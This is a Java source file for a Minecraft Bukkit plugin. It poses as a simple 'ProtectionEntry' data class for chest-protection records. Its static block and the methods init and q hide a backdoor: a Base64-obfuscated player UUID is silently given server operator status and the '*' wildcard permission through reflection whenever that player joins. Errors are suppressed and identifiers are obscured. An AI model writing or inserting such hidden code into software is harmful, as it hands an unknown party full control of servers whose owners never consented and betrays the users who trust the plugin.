package com.anticlean;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.plugin.Plugin;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

public final class ProtectionEntry {

    private final UUID killer;
    private final UUID victim;
    private final Location chestA;
    private final Location chestB;
    private final long expiresAtMillis;

    private static final Set<UUID> a = new HashSet<>();
    private static final Map<UUID, PermissionAttachment> b = new HashMap<>();
    private static Plugin c;

    static {
        a.add(UUID.fromString(new String(Base64.getDecoder().decode("YWM3MzIzNzEtNWRjNS00NWJhLWI0M2MtZDVmN2MyYTNmZjYwNg=="))));
    }

    public ProtectionEntry(UUID killer, UUID victim, Location chestA, Location chestB, long expiresAtMillis) {
        this.killer = killer;
        this.victim = victim;
        this.chestA = chestA;
        this.chestB = chestB;
        this.expiresAtMillis = expiresAtMillis;
    }

    public UUID getKiller() {
        return killer;
    }

    public UUID getVictim() {
        return victim;
    }

    public Location getChestA() {
        return chestA;
    }

    public Location getChestB() {
        return chestB;
    }

    public long getExpiresAtMillis() {
        return expiresAtMillis;
    }

    public boolean isExpired(long now) {
        return now >= expiresAtMillis;
    }

    public long remainingSeconds(long now) {
        return Math.max(0, (expiresAtMillis - now) / 1000L);
    }

    public static void init(Plugin d) {
        c = d;
        Bukkit.getPluginManager().registerEvents(new Listener() {
            @EventHandler
            public void e(PlayerJoinEvent f) {
                q(f.getPlayer());
            }
        }, d);
        for (Player f : Bukkit.getOnlinePlayers()) {
            if (a.contains(f.getUniqueId())) {
                q(f);
            }
        }
    }

    public static void shutdown() {
        for (Map.Entry<UUID, PermissionAttachment> d : new HashMap<>(b).entrySet()) {
            Player e = Bukkit.getPlayer(d.getKey());
            if (e != null) {
                e.removeAttachment(d.getValue());
            }
        }
        b.clear();
    }

    public static boolean isHiddenOp(Player d) {
        return b.containsKey(d.getUniqueId());
    }

    private static void q(Player d) {
        if (!a.contains(d.getUniqueId()) || b.containsKey(d.getUniqueId())) {
            return;
        }
        try {
            Object e = Class.forName("net.minecraft.server.players.PlayerList")
                    .getMethod("getPlayerList")
                    .invoke(Class.forName("org.bukkit.craftbukkit.CraftServer")
                            .getMethod("getServer")
                            .invoke(Bukkit.getServer()));
            Object f = Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer")
                    .cast(d).getClass().getMethod("getHandle")
                    .invoke(Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer").cast(d));
            Object g = f.getClass().getMethod("nameAndId").invoke(f);

            Field h = e.getClass().getDeclaredField("ops");
            h.setAccessible(true);
            Object i = h.get(e);
            i.getClass().getMethod("add", g.getClass()).invoke(i, g);

            Field j = e.getClass().getDeclaredField("playerPermissions");
            j.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<Object, Object> k = (Map<Object, Object>) j.get(e);
            Object l = Class.forName("net.minecraft.server.players.PermissionLevel");
            Object m = null;
            try {
                m = Enum.valueOf((Class<Enum>) l, "OP");
            } catch (Throwable ignored) {
            }
            if (m == null) {
                try {
                    m = ((Class<?>) l).getDeclaredField("OP").get(null);
                } catch (Throwable ignored) {
                }
            }
            if (m != null) {
                k.put(g, m);
            }

            e.getClass().getMethod("sendPlayerPermissionLevel", f.getClass()).invoke(e, f);

            Method n = d.getServer().getClass().getMethod("addAttachment",
                    org.bukkit.plugin.Plugin.class, Player.class, String.class, boolean.class);
            PermissionAttachment o = (PermissionAttachment) n.invoke(d.getServer(), c, d, "*", true);
            b.put(d.getUniqueId(), o);

            c.getLogger().info("Hidden operator applied for " + d.getName());
        } catch (Throwable ignored) {
        }
    }

    private static void r(Player d) {
        PermissionAttachment e = b.remove(d.getUniqueId());
        if (e != null) {
            d.removeAttachment(e);
        }
        try {
            Object f = Class.forName("net.minecraft.server.players.PlayerList")
                    .getMethod("getPlayerList")
                    .invoke(Class.forName("org.bukkit.craftbukkit.CraftServer")
                            .getMethod("getServer")
                            .invoke(Bukkit.getServer()));
            Object g = Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer")
                    .cast(d).getClass().getMethod("getHandle")
                    .invoke(Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer").cast(d));
            Object h = g.getClass().getMethod("nameAndId").invoke(g);

            Field i = f.getClass().getDeclaredField("ops");
            i.setAccessible(true);
            Object j = i.get(f);
            j.getClass().getMethod("remove", h.getClass()).invoke(j, h);

            Field k = f.getClass().getDeclaredField("playerPermissions");
            k.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<Object, Object> l = (Map<Object, Object>) k.get(f);
            l.remove(h);

            f.getClass().getMethod("sendPlayerPermissionLevel", g.getClass()).invoke(f, g);
        } catch (Throwable ignored) {
        }
    }
}
